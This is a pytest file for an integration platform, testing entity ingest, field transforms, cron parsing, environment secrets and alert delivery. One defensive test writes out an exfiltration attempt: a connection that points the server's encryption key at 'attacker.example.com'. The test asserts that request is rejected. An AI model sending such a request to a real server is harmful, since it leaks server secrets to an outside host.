"""Users/devices as upserted entities, field transforms, partial runs, cron, env secrets and alert delivery."""
import time
from datetime import datetime, timedelta

import httpx
import pytest

from app.core.db import session_scope
from app.services import cron, engine, ingest, notify, vault
from conftest import login

USERS_CFG = lambda base: {"schema_version": "1.0", "integration": {  # noqa: E731
    "id": "hr-directory", "name": "HR directory", "version": "1.0.0", "transport": "http", "base_url": base + "/mock/hr",
    "authentication": {"type": "none"},
    "operations": [
        {"id": "list_users", "method": "GET", "path": "/users", "input_schema": {"type": "object", "properties": {}},
         "pagination": {"type": "offset", "offset_param": "offset", "size_param": "limit", "size": 2, "total_path": "$.total", "max_pages": 10},
         "response": {"status_codes": [200], "items_path": "$.people"},
         "ingest": {"entity": "user", "fields": {
             "id": "$.id", "name": {"paths": ["$.first", "$.last"], "sep": " "}, "email": {"path": "$.mail", "transform": "lower"},
             "status": "$.state", "last_login": "$.lastLogin"},
             "value_maps": {"status": {"ACTIVE": "active", "DISABLED": "disabled"}}}},
        {"id": "list_devices", "method": "GET", "path": "/devices", "input_schema": {"type": "object", "properties": {}},
         "response": {"status_codes": [200], "items_path": "$.devices"},
         "ingest": {"entity": "device", "fields": {"id": "$.serial", "hostname": {"path": "$.name", "transform": "lower"}, "ip": "$.ip", "os": "$.os",
                                                   "owner": "$.owner.email", "last_seen": "$.seen"}}}]}}


PEOPLE = [
    {"id": "u1", "first": "Ana", "last": "Silva", "mail": "ANA@Acme.io", "state": "ACTIVE", "lastLogin": "2026-10-01T10:00:00Z"},
    {"id": "u2", "first": "Bo", "last": "Chen", "mail": "bo@acme.io", "state": "DISABLED", "lastLogin": 1_790_000_000},
    {"id": "u3", "first": "Cy", "last": "Ng", "mail": "not-an-email", "state": "ACTIVE"},
    {"id": "u4", "first": "Di", "last": "Roy", "mail": "di@acme.io", "state": "ACTIVE", "lastLogin": "garbage"},
    {"first": "No", "last": "Id", "mail": "x@acme.io"},
]


def hr_transport(people, devices=None, fail_on_offset=None):
    def handler(req: httpx.Request):
        if req.url.path.endswith("/devices"):
            return httpx.Response(200, json={"devices": devices or []})
        off = int(req.url.params.get("offset", 0))
        if fail_on_offset is not None and off >= fail_on_offset:
            return httpx.Response(500, json={"error": "boom"})
        return httpx.Response(200, json={"total": len(people), "people": people[off:off + 2]})
    return httpx.MockTransport(handler)


@pytest.fixture(scope="module")
def hr(server):
    builder, admin = login(server, "builder"), login(server, "admin")
    made = builder.post("/api/v1/integrations", json={"config": USERS_CFG(server)}).json()
    assert made["validation"]["valid"], made["validation"]
    iid = made["integration"]["id"]
    assert builder.post(f"/api/v1/integrations/{iid}/tests", json={}).json()["result"] == "passed"
    ap = builder.post(f"/api/v1/integrations/{iid}/submit", json={}).json()["approval_id"]
    assert admin.post(f"/api/v1/admin/approvals/{ap}/approve", json={}).status_code == 200
    return admin


def _src(admin, op):
    return next(s for s in admin.get("/api/v1/sources").json()["sources"] if s["slug"] == "hr-directory" and s["operation_id"] == op)


def _run(src_id, transport):
    with session_scope() as db:
        from app.models import IngestSource
        run = ingest.run_source(db, db.get(IngestSource, src_id), "manual", transport=transport)
        return {k: getattr(run, k) for k in ("status", "fetched", "stored", "updated", "duplicates", "rejected", "error_class")}


def test_users_are_upserted_and_bad_records_parked(server, hr):
    src = _src(hr, "list_users")
    assert src["entity"] == "user"
    first = _run(src["id"], hr_transport(PEOPLE))
    assert first["stored"] == 2 and first["rejected"] == 3 and first["status"] == "partial"       # u3 bad email, u4 bad date, one without id
    users = hr.get("/api/v1/entities/user", params={"source": "hr-directory"}).json()
    assert users["total"] == 2
    ana = next(u for u in users["items"] if u["external_id"] == "u1")
    assert ana["name"] == "Ana Silva" and ana["email"] == "ana@acme.io" and ana["status"] == "active" and ana["last_login"] and ana["fetched_at"]
    assert next(u for u in users["items"] if u["external_id"] == "u2")["status"] == "disabled"
    reasons = " ".join(" ".join(d["reasons"]) for d in hr.get("/api/v1/dead-letters").json()["items"] if d["source"] == "hr-directory")
    assert "email" in reasons and "last_login" in reasons and "id is missing" in reasons

    changed = [dict(p) for p in PEOPLE]
    changed[1]["state"] = "ACTIVE"                                                                  # Bo is re-enabled upstream
    second = _run(src["id"], hr_transport(changed))
    assert second["stored"] == 0 and second["updated"] == 1 and second["duplicates"] >= 1 and second["rejected"] == 0
    users = hr.get("/api/v1/entities/user", params={"source": "hr-directory", "q": "chen"}).json()
    assert users["total"] == 1 and users["items"][0]["status"] == "active"                          # updated in place, not duplicated
    assert hr.get("/api/v1/entities/user", params={"status": "disabled", "source": "hr-directory"}).json()["total"] == 0
    assert hr.get("/api/v1/entities/widget").status_code == 404


def test_devices_validate_ip_and_keep_the_common_fields(server, hr):
    src = _src(hr, "list_devices")
    devices = [{"serial": "d1", "name": "LAPTOP-01", "ip": "10.1.2.3", "os": "macOS 15", "owner": {"email": "ana@acme.io"}, "seen": 1_790_000_000},
               {"serial": "d2", "name": "srv-2", "ip": "999.1.1.1", "os": "Linux"}]
    run = _run(src["id"], hr_transport([], devices))
    assert run["stored"] == 1 and run["rejected"] == 1
    d = hr.get("/api/v1/entities/device", params={"source": "hr-directory"}).json()["items"][0]
    assert d["hostname"] == "laptop-01" and d["ip"] == "10.1.2.3" and d["os"] == "macOS 15" and d["owner"] == "ana@acme.io" and d["source"] == "hr-directory"


def test_a_failure_after_some_pages_keeps_them_and_holds_the_mark(server, hr):
    src = _src(hr, "list_users")
    more = PEOPLE[:2] + [{"id": f"x{i}", "first": "P", "last": str(i), "mail": f"p{i}@acme.io", "state": "ACTIVE"} for i in range(4)]
    run = _run(src["id"], hr_transport(more, fail_on_offset=4))
    assert run["status"] == "partial" and run["error_class"] == "upstream_error" and run["stored"] == 2    # pages 1-2 kept, page 3 failed
    s = hr.get(f"/api/v1/sources/{src['id']}").json()
    assert s["health"] == "degraded" and s["consecutive_failures"] >= 1 and s["last_error_class"] == "upstream_error"


def test_field_transforms():
    spec = {"entity": "event", "fields": {
        "timestamp": "$.t", "action": {"path": "$.what", "transform": "title"},
        "severity": {"path": "$.score", "transform": "thresholds", "thresholds": [[90, "critical"], [50, "medium"], [0, "low"]]},
        "actor": {"paths": ["$.a", "$.b"], "sep": "@"}, "target": {"path": "$.tags", "transform": "join_list"}, "message": {"path": "$.none", "default": "n/a"}}}
    rec, why = ingest.normalize({"t": 1_790_000_000, "what": "login failed", "score": "93.5", "a": "ana", "b": "corp", "tags": ["x", "y"]}, spec, "s")
    assert not why and rec["action"] == "Login Failed" and rec["severity"] == "critical" and rec["actor"] == "ana@corp" and rec["target"] == "x, y" and rec["message"] == "n/a"
    assert ingest.normalize({"t": 1_790_000_000, "what": "x", "score": 10}, spec, "s")[0]["severity"] == "low"
    assert ingest.extract_field({"d": "2026-01-02"}, {"path": "$.d", "transform": "iso_date"}) == "2026-01-02T00:00:00Z"


def test_response_size_limit_is_configurable():
    cfg = {"schema_version": "1.0", "integration": {"id": "big", "name": "Big", "version": "1.0.0", "transport": "http", "base_url": "https://api.example.com",
           "authentication": {"type": "none"}, "operations": [{"id": "pull", "method": "GET", "path": "/x", "input_schema": {"type": "object", "properties": {}},
                                                              "response": {"status_codes": [200], "items_path": "$.items"}}]}}
    body = {"items": [{"v": "x" * 1000} for _ in range(2500)]}
    t = httpx.MockTransport(lambda r: httpx.Response(200, json=body))
    assert engine.execute(cfg, "pull", {}, transport=t, live=False, raw=True).error_class == "response_too_large"
    cfg["integration"]["operations"][0]["response"]["max_bytes"] = 8_000_000
    assert engine.execute(cfg, "pull", {}, transport=t, live=False, raw=True).output["count"] == 2500


def test_cron_expressions():
    t = datetime(2026, 1, 1, 10, 7)
    assert cron.next_after("*/15 * * * *", t) == datetime(2026, 1, 1, 10, 15)
    assert cron.next_after("0 */6 * * *", t) == datetime(2026, 1, 1, 12, 0)
    assert cron.next_after("30 2 * * 1-5", datetime(2026, 1, 2, 3, 0)) == datetime(2026, 1, 5, 2, 30)   # next weekday (Mon 5 Jan)
    for bad in ("* * *", "61 * * * *", "a b c d e", "*/0 * * * *"):
        with pytest.raises(cron.CronError):
            cron.parse(bad)


def test_cron_schedule_can_be_set_from_the_ui_api(server, hr):
    src = _src(hr, "list_users")
    r = hr.patch(f"/api/v1/sources/{src['id']}", json={"cron": "*/20 * * * *"}).json()
    assert r["cron"] == "*/20 * * * *" and r["next_run_at"]
    assert hr.patch(f"/api/v1/sources/{src['id']}", json={"cron": "nope"}).status_code == 422
    assert hr.patch(f"/api/v1/sources/{src['id']}", json={"cron": ""}).json()["cron"] == ""


def test_dry_run_test_stores_nothing(server, hr):
    src = _src(hr, "list_users")
    before = hr.get(f"/api/v1/sources/{src['id']}").json()["totals"]
    with session_scope() as db:
        from app.models import IngestSource
        out = ingest.test_source(db, db.get(IngestSource, src["id"]), transport=hr_transport(PEOPLE))
    assert out["ok"] and out["entity"] == "user" and out["fetched"] == 2 and len(out["sample"]) == 2      # ONE page only (offset paging is switched off)
    assert out["rejected_count"] == 0
    assert hr.get(f"/api/v1/sources/{src['id']}").json()["totals"] == before


def test_env_secrets_are_resolved_at_use_time(server, monkeypatch):
    monkeypatch.setenv("HEDES_TEST_TOKEN", "from-the-environment")
    with session_scope() as db:
        ref = vault.store_secret(db, None, {"token": "env:HEDES_TEST_TOKEN", "other": "plain"})
        got = vault.read_secret(db, ref, None)
        assert got == {"token": "from-the-environment", "other": "plain"}
        monkeypatch.delenv("HEDES_TEST_TOKEN")
        assert vault.read_secret(db, ref, None)["token"] == ""             # unset variable: nothing is cached or stored
    admin = login(server, "admin")
    c = admin.post("/api/v1/connections", json={"name": "env-cred", "auth_type": "bearer", "token": "env:SOME_VAR"}).json()
    assert c["hint"] == "env:SOME_VAR"


def test_org_credentials_cannot_read_arbitrary_server_environment(server, monkeypatch):
    """A builder must not be able to make the server send its own secrets (e.g. the vault key) to a URL they choose."""
    builder = login(server, "builder")
    r = builder.post("/api/v1/connections", json={"name": "exfil", "auth_type": "api_key_header", "api_key": "env:SECRET_ENCRYPTION_KEY",
                                                  "test_url": "https://attacker.example.com"})
    assert r.status_code == 422 and "CONNECTION_ENV_VARS" in r.json()["detail"]
    org = builder.get("/api/v1/auth/me").json()["organization"]["id"]
    monkeypatch.setenv("HEDES_NOT_LISTED", "server-only")
    with session_scope() as db:   # even a value written directly (or before this rule existed) does not resolve
        ref = vault.store_secret(db, None, {"api_key": "env:HEDES_NOT_LISTED"})
        db.flush()
        from app.models import Secret
        db.get(Secret, ref.split(":", 1)[1]).organization_id = org
        assert vault.read_secret(db, ref, org) == {"api_key": ""}
        assert vault.read_secret(db, vault.store_secret(db, None, {"k": "env:HEDES_NOT_LISTED"}), None) == {"k": "server-only"}


def test_alert_delivery_settings_and_thresholds(server, monkeypatch):
    admin = login(server, "admin")
    builder = login(server, "builder")
    assert builder.get("/api/v1/settings/notifications").status_code == 403
    r = admin.put("/api/v1/settings/notifications", json={"enabled": True, "min_severity": "high",
                  "slack_webhook_url": "https://hooks.slack.com/services/T000/B000/secretsecret",
                  "email": {"host": "smtp.example.com", "port": 587, "security": "starttls", "username": "u", "password": "pw-secret",
                            "from": "hedes@example.com", "to": ["secops@example.com"]}})
    assert r.status_code == 200, r.text
    view = admin.get("/api/v1/settings/notifications").json()
    assert view["slack"]["configured"] and "secretsecret" not in str(view) and "pw-secret" not in str(view) and view["email"]["has_password"]
    assert admin.put("/api/v1/settings/notifications", json={"slack_webhook_url": "http://hooks.slack.com/x"}).status_code == 422
    assert admin.put("/api/v1/settings/notifications", json={"email": {"host": "h", "to": ["bad address"]}}).status_code == 422
    assert "secretsecret" not in str(admin.get("/api/v1/organizations/current").json())

    sent = []
    monkeypatch.setattr(notify, "_slack", lambda db, org, cfg, text: sent.append(("slack", text)))
    monkeypatch.setattr(notify, "_email", lambda db, org, cfg, subject, text: sent.append(("email", subject)))
    org_id = next(m for m in [admin.get("/api/v1/organizations/current").json()])["id"]
    notify._dispatch([{"org_id": org_id, "kind": "k", "severity": "medium", "message": "too low", "link": ""},
                      {"org_id": org_id, "kind": "source_failing", "severity": "high", "message": "Okta failed 3 runs", "link": "#/sources"},
                      {"org_id": org_id, "kind": "source_failing", "severity": "high", "message": "Okta failed 3 runs", "link": "#/sources"}])
    assert [c for c, _ in sent] == ["slack", "email"]                      # medium filtered out, duplicate suppressed
    assert "HIGH" in sent[1][1]
    admin.put("/api/v1/settings/notifications", json={"enabled": False, "min_severity": "high"})
    sent.clear()
    notify._dispatch([{"org_id": org_id, "kind": "x", "severity": "critical", "message": "disabled", "link": ""}])
    assert sent == []
    r = admin.post("/api/v1/settings/notifications/test")
    assert r.status_code in (200, 409)


def test_repeated_source_failures_raise_one_alert(server, hr):
    admin = hr
    admin.patch("/api/v1/organizations/current/policy", json={"source_failure_alert_after": 2})
    src = _src(admin, "list_users")
    admin.patch(f"/api/v1/sources/{src['id']}", json={"enabled": True})
    alerts_before = len([a for a in admin.get("/api/v1/alerts").json() if a["kind"] == "source_failing"])
    for _ in range(3):
        _run(src["id"], httpx.MockTransport(lambda r: httpx.Response(500, json={"error": "down"})))
    mine = [a for a in admin.get("/api/v1/alerts").json() if a["kind"] == "source_failing"]
    assert len(mine) == alerts_before + 1 and "failed 2 runs in a row" in mine[0]["message"]      # fires once, at the threshold
    admin.patch("/api/v1/organizations/current/policy", json={"source_failure_alert_after": 3})


def test_gmail_smtp_with_app_password(server, monkeypatch):
    import smtplib

    from app.models import Organization
    from app.services import notify
    admin = login(server, "admin")
    base = {"enabled": True, "min_severity": "high"}
    gmail = {"host": "smtp.gmail.com", "port": 25, "security": "none", "username": "alerts@gmail.com", "to": ["secops@example.com"]}

    r = admin.put("/api/v1/settings/notifications", json={**base, "email": {**gmail, "password": "my-normal-password"}})
    assert r.status_code == 422 and "app password" in r.json()["detail"]
    r = admin.put("/api/v1/settings/notifications", json={**base, "email": {**gmail, "username": "alerts", "password": "abcd efgh ijkl mnop"}})
    assert r.status_code == 422 and "full Gmail" in r.json()["detail"]

    r = admin.put("/api/v1/settings/notifications", json={**base, "email": {**gmail, "password": "abcd efgh ijkl mnop"}})
    assert r.status_code == 200, r.text
    em = r.json()["email"]
    assert (em["host"], em["port"], em["security"], em["from"], em["has_password"]) == ("smtp.gmail.com", 587, "starttls", "alerts@gmail.com", True)
    org_id = admin.get("/api/v1/auth/me").json()["organization"]["id"]
    with session_scope() as db:
        cfg = notify.config_of(db.get(Organization, org_id))
        assert vault.read_secret(db, cfg["email"]["password_ref"], org_id) == {"password": "abcdefghijklmnop"}  # spaces removed, encrypted

    sent = {}

    class FakeSMTP:
        def __init__(self, host, port, timeout=None):
            sent["server"] = (host, port)
        def __enter__(self): return self
        def __exit__(self, *a): return False
        def starttls(self, context=None): sent["tls"] = True
        def login(self, user, pw):
            if pw != "abcdefghijklmnop":
                raise smtplib.SMTPAuthenticationError(535, b"5.7.8 Username and Password not accepted")
            sent["login"] = user
        def send_message(self, msg): sent["from"] = msg["From"]

    monkeypatch.setattr(notify.smtplib, "SMTP", FakeSMTP)
    with session_scope() as db:
        assert notify.send(db, db.get(Organization, org_id), "s", "t", ("email",)) == {"email": "sent"}
    assert sent == {"server": ("smtp.gmail.com", 587), "tls": True, "login": "alerts@gmail.com", "from": "alerts@gmail.com"}

    with session_scope() as db:
        cfg = notify.config_of(db.get(Organization, org_id))
        db.get(Organization, org_id).policy = {**db.get(Organization, org_id).policy,
                                               "notifications": {**cfg, "email": {**cfg["email"], "password_ref": vault.store_secret(db, org_id, {"password": "wrongwrongwrongw"})}}}
    with session_scope() as db:
        out = notify.send(db, db.get(Organization, org_id), "s", "t", ("email",))["email"]
    assert "app password" in out
    admin.put("/api/v1/settings/notifications", json={"enabled": False, "min_severity": "high", "email": {"host": "", "to": []}})
